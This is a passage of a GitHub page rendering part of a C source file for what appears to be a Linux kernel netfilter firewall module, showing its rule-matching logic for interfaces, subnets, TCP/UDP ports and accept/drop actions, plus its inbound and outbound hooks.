          <td id="file-firewall-c-L339" class="blob-num js-line-number js-code-nav-line-number" data-line-number="339"></td>
          <td id="file-firewall-c-LC339" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> tcphdr *tcph;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L340" class="blob-num js-line-number js-code-nav-line-number" data-line-number="340"></td>
          <td id="file-firewall-c-LC340" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> udphdr *udph;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L341" class="blob-num js-line-number js-code-nav-line-number" data-line-number="341"></td>
          <td id="file-firewall-c-LC341" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L342" class="blob-num js-line-number js-code-nav-line-number" data-line-number="342"></td>
          <td id="file-firewall-c-LC342" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] rule-&gt;iface: <span class="pl-c1">%s</span>...<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, rule-&gt;<span class="pl-smi">iface</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L343" class="blob-num js-line-number js-code-nav-line-number" data-line-number="343"></td>
          <td id="file-firewall-c-LC343" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] skb-&gt;dev-&gt;name: <span class="pl-c1">%s</span>...<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, skb-&gt;<span class="pl-smi">dev</span>-&gt;<span class="pl-smi">name</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L344" class="blob-num js-line-number js-code-nav-line-number" data-line-number="344"></td>
          <td id="file-firewall-c-LC344" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L345" class="blob-num js-line-number js-code-nav-line-number" data-line-number="345"></td>
          <td id="file-firewall-c-LC345" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">strncmp</span>(rule-&gt;<span class="pl-smi">iface</span>, skb-&gt;<span class="pl-smi">dev</span>-&gt;<span class="pl-smi">name</span>, <span class="pl-c1">16</span>) != <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L346" class="blob-num js-line-number js-code-nav-line-number" data-line-number="346"></td>
          <td id="file-firewall-c-LC346" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L347" class="blob-num js-line-number js-code-nav-line-number" data-line-number="347"></td>
          <td id="file-firewall-c-LC347" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], inferface doesn't match, skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L348" class="blob-num js-line-number js-code-nav-line-number" data-line-number="348"></td>
          <td id="file-firewall-c-LC348" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L349" class="blob-num js-line-number js-code-nav-line-number" data-line-number="349"></td>
          <td id="file-firewall-c-LC349" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L350" class="blob-num js-line-number js-code-nav-line-number" data-line-number="350"></td>
          <td id="file-firewall-c-LC350" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L351" class="blob-num js-line-number js-code-nav-line-number" data-line-number="351"></td>
          <td id="file-firewall-c-LC351" class="blob-code blob-code-inner js-file-line">    iph = <span class="pl-c1">ip_hdr</span>(skb);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L352" class="blob-num js-line-number js-code-nav-line-number" data-line-number="352"></td>
          <td id="file-firewall-c-LC352" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L353" class="blob-num js-line-number js-code-nav-line-number" data-line-number="353"></td>
          <td id="file-firewall-c-LC353" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (type == INBOUND)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L354" class="blob-num js-line-number js-code-nav-line-number" data-line-number="354"></td>
          <td id="file-firewall-c-LC354" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L355" class="blob-num js-line-number js-code-nav-line-number" data-line-number="355"></td>
          <td id="file-firewall-c-LC355" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">ip</span> &amp; rule-&gt;<span class="pl-smi">netmask</span>) != (iph-&gt;<span class="pl-smi">saddr</span> &amp; rule-&gt;<span class="pl-smi">netmask</span>))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L356" class="blob-num js-line-number js-code-nav-line-number" data-line-number="356"></td>
          <td id="file-firewall-c-LC356" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L357" class="blob-num js-line-number js-code-nav-line-number" data-line-number="357"></td>
          <td id="file-firewall-c-LC357" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], ip-&gt;saddr doesn't belong to the provided subnet, skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L358" class="blob-num js-line-number js-code-nav-line-number" data-line-number="358"></td>
          <td id="file-firewall-c-LC358" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L359" class="blob-num js-line-number js-code-nav-line-number" data-line-number="359"></td>
          <td id="file-firewall-c-LC359" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L360" class="blob-num js-line-number js-code-nav-line-number" data-line-number="360"></td>
          <td id="file-firewall-c-LC360" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L361" class="blob-num js-line-number js-code-nav-line-number" data-line-number="361"></td>
          <td id="file-firewall-c-LC361" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L362" class="blob-num js-line-number js-code-nav-line-number" data-line-number="362"></td>
          <td id="file-firewall-c-LC362" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L363" class="blob-num js-line-number js-code-nav-line-number" data-line-number="363"></td>
          <td id="file-firewall-c-LC363" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">ip</span> &amp; rule-&gt;<span class="pl-smi">netmask</span>) != (iph-&gt;<span class="pl-smi">daddr</span> &amp; rule-&gt;<span class="pl-smi">netmask</span>))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L364" class="blob-num js-line-number js-code-nav-line-number" data-line-number="364"></td>
          <td id="file-firewall-c-LC364" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L365" class="blob-num js-line-number js-code-nav-line-number" data-line-number="365"></td>
          <td id="file-firewall-c-LC365" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], ip-&gt;daddr doesn't belong to the provided subnet, skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L366" class="blob-num js-line-number js-code-nav-line-number" data-line-number="366"></td>
          <td id="file-firewall-c-LC366" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L367" class="blob-num js-line-number js-code-nav-line-number" data-line-number="367"></td>
          <td id="file-firewall-c-LC367" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L368" class="blob-num js-line-number js-code-nav-line-number" data-line-number="368"></td>
          <td id="file-firewall-c-LC368" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L369" class="blob-num js-line-number js-code-nav-line-number" data-line-number="369"></td>
          <td id="file-firewall-c-LC369" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L370" class="blob-num js-line-number js-code-nav-line-number" data-line-number="370"></td>
          <td id="file-firewall-c-LC370" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">proto</span> == IPPROTO_TCP) &amp;&amp; (iph-&gt;<span class="pl-smi">protocol</span> == IPPROTO_TCP))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L371" class="blob-num js-line-number js-code-nav-line-number" data-line-number="371"></td>
          <td id="file-firewall-c-LC371" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L372" class="blob-num js-line-number js-code-nav-line-number" data-line-number="372"></td>
          <td id="file-firewall-c-LC372" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] Rule[<span class="pl-c1">%d</span>], protocol is TCP<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L373" class="blob-num js-line-number js-code-nav-line-number" data-line-number="373"></td>
          <td id="file-firewall-c-LC373" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L374" class="blob-num js-line-number js-code-nav-line-number" data-line-number="374"></td>
          <td id="file-firewall-c-LC374" class="blob-code blob-code-inner js-file-line">        tcph = <span class="pl-c1">tcp_hdr</span>(skb);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L375" class="blob-num js-line-number js-code-nav-line-number" data-line-number="375"></td>
          <td id="file-firewall-c-LC375" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L376" class="blob-num js-line-number js-code-nav-line-number" data-line-number="376"></td>
          <td id="file-firewall-c-LC376" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">port</span> != <span class="pl-c1">0</span>) &amp;&amp; (rule-&gt;<span class="pl-smi">port</span> != tcph-&gt;<span class="pl-smi">dest</span>))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L377" class="blob-num js-line-number js-code-nav-line-number" data-line-number="377"></td>
          <td id="file-firewall-c-LC377" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L378" class="blob-num js-line-number js-code-nav-line-number" data-line-number="378"></td>
          <td id="file-firewall-c-LC378" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], rule-&gt;port (<span class="pl-c1">%d</span>) != tcph-&gt;dest (<span class="pl-c1">%d</span>), skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i, <span class="pl-c1">ntohs</span>(rule-&gt;<span class="pl-smi">port</span>), <span class="pl-c1">ntohs</span>(tcph-&gt;<span class="pl-smi">dest</span>));</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L379" class="blob-num js-line-number js-code-nav-line-number" data-line-number="379"></td>
          <td id="file-firewall-c-LC379" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L380" class="blob-num js-line-number js-code-nav-line-number" data-line-number="380"></td>
          <td id="file-firewall-c-LC380" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L381" class="blob-num js-line-number js-code-nav-line-number" data-line-number="381"></td>
          <td id="file-firewall-c-LC381" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L382" class="blob-num js-line-number js-code-nav-line-number" data-line-number="382"></td>
          <td id="file-firewall-c-LC382" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">action</span> != NF_DROP) &amp;&amp; (rule-&gt;<span class="pl-smi">action</span> != NF_ACCEPT))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L383" class="blob-num js-line-number js-code-nav-line-number" data-line-number="383"></td>
          <td id="file-firewall-c-LC383" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L384" class="blob-num js-line-number js-code-nav-line-number" data-line-number="384"></td>
          <td id="file-firewall-c-LC384" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], invalid action (<span class="pl-c1">%d</span>), skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i, rule-&gt;<span class="pl-smi">action</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L385" class="blob-num js-line-number js-code-nav-line-number" data-line-number="385"></td>
          <td id="file-firewall-c-LC385" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L386" class="blob-num js-line-number js-code-nav-line-number" data-line-number="386"></td>
          <td id="file-firewall-c-LC386" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L387" class="blob-num js-line-number js-code-nav-line-number" data-line-number="387"></td>
          <td id="file-firewall-c-LC387" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L388" class="blob-num js-line-number js-code-nav-line-number" data-line-number="388"></td>
          <td id="file-firewall-c-LC388" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] <span class="pl-c1">%s</span> Rule[<span class="pl-c1">%d</span>], action <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, (type == INBOUND) ? <span class="pl-s"><span class="pl-pds">"</span>Inbound<span class="pl-pds">"</span></span> : <span class="pl-s"><span class="pl-pds">"</span>Outbound<span class="pl-pds">"</span></span>, i, rule-&gt;<span class="pl-smi">action</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L389" class="blob-num js-line-number js-code-nav-line-number" data-line-number="389"></td>
          <td id="file-firewall-c-LC389" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L390" class="blob-num js-line-number js-code-nav-line-number" data-line-number="390"></td>
          <td id="file-firewall-c-LC390" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> rule-&gt;<span class="pl-smi">action</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L391" class="blob-num js-line-number js-code-nav-line-number" data-line-number="391"></td>
          <td id="file-firewall-c-LC391" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L392" class="blob-num js-line-number js-code-nav-line-number" data-line-number="392"></td>
          <td id="file-firewall-c-LC392" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L393" class="blob-num js-line-number js-code-nav-line-number" data-line-number="393"></td>
          <td id="file-firewall-c-LC393" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">else</span> <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">proto</span> == IPPROTO_UDP) &amp;&amp; (iph-&gt;<span class="pl-smi">protocol</span> == IPPROTO_UDP))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L394" class="blob-num js-line-number js-code-nav-line-number" data-line-number="394"></td>
          <td id="file-firewall-c-LC394" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L395" class="blob-num js-line-number js-code-nav-line-number" data-line-number="395"></td>
          <td id="file-firewall-c-LC395" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] Rule[<span class="pl-c1">%d</span>], protocol is UDP<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L396" class="blob-num js-line-number js-code-nav-line-number" data-line-number="396"></td>
          <td id="file-firewall-c-LC396" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L397" class="blob-num js-line-number js-code-nav-line-number" data-line-number="397"></td>
          <td id="file-firewall-c-LC397" class="blob-code blob-code-inner js-file-line">        udph = <span class="pl-c1">udp_hdr</span>(skb);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L398" class="blob-num js-line-number js-code-nav-line-number" data-line-number="398"></td>
          <td id="file-firewall-c-LC398" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L399" class="blob-num js-line-number js-code-nav-line-number" data-line-number="399"></td>
          <td id="file-firewall-c-LC399" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">port</span> != <span class="pl-c1">0</span>) &amp;&amp; (rule-&gt;<span class="pl-smi">port</span> != udph-&gt;<span class="pl-smi">dest</span>))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L400" class="blob-num js-line-number js-code-nav-line-number" data-line-number="400"></td>
          <td id="file-firewall-c-LC400" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L401" class="blob-num js-line-number js-code-nav-line-number" data-line-number="401"></td>
          <td id="file-firewall-c-LC401" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], rule-&gt;port (<span class="pl-c1">%d</span>) != udph-&gt;dest (<span class="pl-c1">%d</span>), skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i, <span class="pl-c1">ntohs</span>(rule-&gt;<span class="pl-smi">port</span>), <span class="pl-c1">ntohs</span>(udph-&gt;<span class="pl-smi">dest</span>));</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L402" class="blob-num js-line-number js-code-nav-line-number" data-line-number="402"></td>
          <td id="file-firewall-c-LC402" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L403" class="blob-num js-line-number js-code-nav-line-number" data-line-number="403"></td>
          <td id="file-firewall-c-LC403" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L404" class="blob-num js-line-number js-code-nav-line-number" data-line-number="404"></td>
          <td id="file-firewall-c-LC404" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L405" class="blob-num js-line-number js-code-nav-line-number" data-line-number="405"></td>
          <td id="file-firewall-c-LC405" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((rule-&gt;<span class="pl-smi">action</span> != NF_DROP) &amp;&amp; (rule-&gt;<span class="pl-smi">action</span> != NF_ACCEPT))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L406" class="blob-num js-line-number js-code-nav-line-number" data-line-number="406"></td>
          <td id="file-firewall-c-LC406" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L407" class="blob-num js-line-number js-code-nav-line-number" data-line-number="407"></td>
          <td id="file-firewall-c-LC407" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Rule[<span class="pl-c1">%d</span>], invalid action (<span class="pl-c1">%d</span>), skipping!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i, rule-&gt;<span class="pl-smi">action</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L408" class="blob-num js-line-number js-code-nav-line-number" data-line-number="408"></td>
          <td id="file-firewall-c-LC408" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L409" class="blob-num js-line-number js-code-nav-line-number" data-line-number="409"></td>
          <td id="file-firewall-c-LC409" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L410" class="blob-num js-line-number js-code-nav-line-number" data-line-number="410"></td>
          <td id="file-firewall-c-LC410" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L411" class="blob-num js-line-number js-code-nav-line-number" data-line-number="411"></td>
          <td id="file-firewall-c-LC411" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] <span class="pl-c1">%s</span> Rule[<span class="pl-c1">%d</span>], action <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, (type == INBOUND) ? <span class="pl-s"><span class="pl-pds">"</span>Inbound<span class="pl-pds">"</span></span> : <span class="pl-s"><span class="pl-pds">"</span>Outbound<span class="pl-pds">"</span></span>, i, rule-&gt;<span class="pl-smi">action</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L412" class="blob-num js-line-number js-code-nav-line-number" data-line-number="412"></td>
          <td id="file-firewall-c-LC412" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L413" class="blob-num js-line-number js-code-nav-line-number" data-line-number="413"></td>
          <td id="file-firewall-c-LC413" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> rule-&gt;<span class="pl-smi">action</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L414" class="blob-num js-line-number js-code-nav-line-number" data-line-number="414"></td>
          <td id="file-firewall-c-LC414" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L415" class="blob-num js-line-number js-code-nav-line-number" data-line-number="415"></td>
          <td id="file-firewall-c-LC415" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L416" class="blob-num js-line-number js-code-nav-line-number" data-line-number="416"></td>
          <td id="file-firewall-c-LC416" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> SKIP;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L417" class="blob-num js-line-number js-code-nav-line-number" data-line-number="417"></td>
          <td id="file-firewall-c-LC417" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L418" class="blob-num js-line-number js-code-nav-line-number" data-line-number="418"></td>
          <td id="file-firewall-c-LC418" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L419" class="blob-num js-line-number js-code-nav-line-number" data-line-number="419"></td>
          <td id="file-firewall-c-LC419" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L420" class="blob-num js-line-number js-code-nav-line-number" data-line-number="420"></td>
          <td id="file-firewall-c-LC420" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-c1">uint32_t</span> <span class="pl-en">firewall_inbound_hook</span>(<span class="pl-k">void</span> *priv, <span class="pl-k">struct</span> sk_buff *skb, <span class="pl-k">const</span> <span class="pl-k">struct</span> nf_hook_state *state)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L421" class="blob-num js-line-number js-code-nav-line-number" data-line-number="421"></td>
          <td id="file-firewall-c-LC421" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L422" class="blob-num js-line-number js-code-nav-line-number" data-line-number="422"></td>
          <td id="file-firewall-c-LC422" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> i;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L423" class="blob-num js-line-number js-code-nav-line-number" data-line-number="423"></td>
          <td id="file-firewall-c-LC423" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> ret;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L424" class="blob-num js-line-number js-code-nav-line-number" data-line-number="424"></td>
          <td id="file-firewall-c-LC424" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L425" class="blob-num js-line-number js-code-nav-line-number" data-line-number="425"></td>
          <td id="file-firewall-c-LC425" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (i = <span class="pl-c1">0</span>; i &lt; MAX_RULES; i++)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L426" class="blob-num js-line-number js-code-nav-line-number" data-line-number="426"></td>
          <td id="file-firewall-c-LC426" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L427" class="blob-num js-line-number js-code-nav-line-number" data-line-number="427"></td>
          <td id="file-firewall-c-LC427" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (firewall_rules_in[i])</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L428" class="blob-num js-line-number js-code-nav-line-number" data-line-number="428"></td>
          <td id="file-firewall-c-LC428" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L429" class="blob-num js-line-number js-code-nav-line-number" data-line-number="429"></td>
          <td id="file-firewall-c-LC429" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">process_rule</span>(skb, firewall_rules_in[i], INBOUND, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L430" class="blob-num js-line-number js-code-nav-line-number" data-line-number="430"></td>
          <td id="file-firewall-c-LC430" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L431" class="blob-num js-line-number js-code-nav-line-number" data-line-number="431"></td>
          <td id="file-firewall-c-LC431" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (ret != SKIP)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L432" class="blob-num js-line-number js-code-nav-line-number" data-line-number="432"></td>
          <td id="file-firewall-c-LC432" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">return</span> ret;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L433" class="blob-num js-line-number js-code-nav-line-number" data-line-number="433"></td>
          <td id="file-firewall-c-LC433" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L434" class="blob-num js-line-number js-code-nav-line-number" data-line-number="434"></td>
          <td id="file-firewall-c-LC434" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L435" class="blob-num js-line-number js-code-nav-line-number" data-line-number="435"></td>
          <td id="file-firewall-c-LC435" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L436" class="blob-num js-line-number js-code-nav-line-number" data-line-number="436"></td>
          <td id="file-firewall-c-LC436" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> NF_ACCEPT;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L437" class="blob-num js-line-number js-code-nav-line-number" data-line-number="437"></td>
          <td id="file-firewall-c-LC437" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L438" class="blob-num js-line-number js-code-nav-line-number" data-line-number="438"></td>
          <td id="file-firewall-c-LC438" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L439" class="blob-num js-line-number js-code-nav-line-number" data-line-number="439"></td>
          <td id="file-firewall-c-LC439" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L440" class="blob-num js-line-number js-code-nav-line-number" data-line-number="440"></td>
          <td id="file-firewall-c-LC440" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-c1">uint32_t</span> <span class="pl-en">firewall_outbound_hook</span>(<span class="pl-k">void</span> *priv, <span class="pl-k">struct</span> sk_buff *skb, <span class="pl-k">const</span> <span class="pl-k">struct</span> nf_hook_state *state)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L441" class="blob-num js-line-number js-code-nav-line-number" data-line-number="441"></td>
          <td id="file-firewall-c-LC441" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L442" class="blob-num js-line-number js-code-nav-line-number" data-line-number="442"></td>
          <td id="file-firewall-c-LC442" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> i;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L443" class="blob-num js-line-number js-code-nav-line-number" data-line-number="443"></td>
          <td id="file-firewall-c-LC443" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> ret;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L444" class="blob-num js-line-number js-code-nav-line-number" data-line-number="444"></td>
          <td id="file-firewall-c-LC444" class="blob-code blob-code-inner js-file-line">
</td>
